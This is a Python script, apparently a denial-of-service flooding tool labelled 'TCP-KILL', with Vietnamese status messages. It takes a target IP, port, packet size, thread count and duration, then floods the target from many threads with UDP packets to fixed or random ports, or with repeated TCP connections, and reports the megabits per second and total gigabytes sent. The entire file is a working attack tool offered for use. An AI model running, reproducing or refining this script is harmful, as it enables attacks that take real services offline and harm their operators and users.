import sys
from socket import socket, AF_INET, SOCK_STREAM, SOCK_DGRAM
from colored import fg, attr
from threading import Thread
from random import randint
from time import time, sleep

class xNeonDzai:
    def __init__(self, ip, port, force, threads, protocol):
        self.ip = ip
        self.port = port
        self.force = force  # default: 1500
        self.threads = threads  # default: 100
        self.protocol = protocol.upper()  # 'UDP' or 'TCP'
        
        if self.protocol == 'UDP':
            self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        elif self.protocol == 'TCP':
            self.client = socket(family=AF_INET, type=SOCK_STREAM)

        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()

    def info(self):
        interval = 0.05
        now = time()
        size = 0
        self.total = 0
        bytediff = 8
        mb = 1000000
        gb = 1000000000

        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(f"{fg(255)}[{fg(201)}TCP-KILL{fg(255)}] {fg(199)}Sending {fg(198)}Packet: {fg(197)}{round(size)} Mb/s {fg(198)}- {fg(199)}Total: {fg(200)}{round(self.total, 1)} {fg(201)}Gb. {' ' * 20} {attr(0)}", end='\r')

            now2 = time()

            if now + 1 >= now2:
                continue

            size = round(self.sent * bytediff / mb)
            self.sent = 0

            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                if self.protocol == 'UDP':
                    self.client.sendto(self.data, self._randaddr())
                elif self.protocol == 'TCP':
                    self.client.connect((self.ip, self.port))
                    self.client.sendall(self.data)
                    self.client.close()

                self.sent += self.len
            except:
                pass

    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)


def main():
    if len(sys.argv) < 5:
        print("Usage: python tcp.py <IP> <Port> <Packet Size> <Thread> <Time>")
        return

    ip = sys.argv[1]
    port = int(sys.argv[2]) if sys.argv[2] != '0' else None
    force = int(sys.argv[3])
    threads = int(sys.argv[4])
    duration = int(sys.argv[5])

    tcp_ports = [80, 443, 8080, 22]
    protocol = 'UDP' if port and port not in [80, 443] else 'TCP'

    print(f"{fg(196)}Starting {fg(197)}Attack {fg(198)}on {fg(200)}{ip}{fg(255)}:{fg(200)}{port} {fg(202)}({protocol}){attr(0)}", end='\r')
    xneon = xNeonDzai(ip, port, force, threads, protocol)
    try:
        xneon.flood()
        sleep(duration)
    except:
        xneon.stop()
        print(f"{fg(196)}Đã xảy {fg(197)}ra lỗi {fg(198)}nên cuộc {fg(199)}tấn công {fg(198)}đã bị {fg(196)}dừng.{attr(0)}")
    xneon.stop()
    print(f"{fg(40)}Tổng {fg(41)}Số {fg(42)}Packet {fg(42)}Đã Được {fg(43)}Đến {fg(44)}{ip}{fg(255)}:{fg(44)}{port} {fg(43)}Là {fg(42)}{round(xneon.total, 1)} Gb.{attr(0)}")
    sleep(1)

if __name__ == '__main__':
    main()
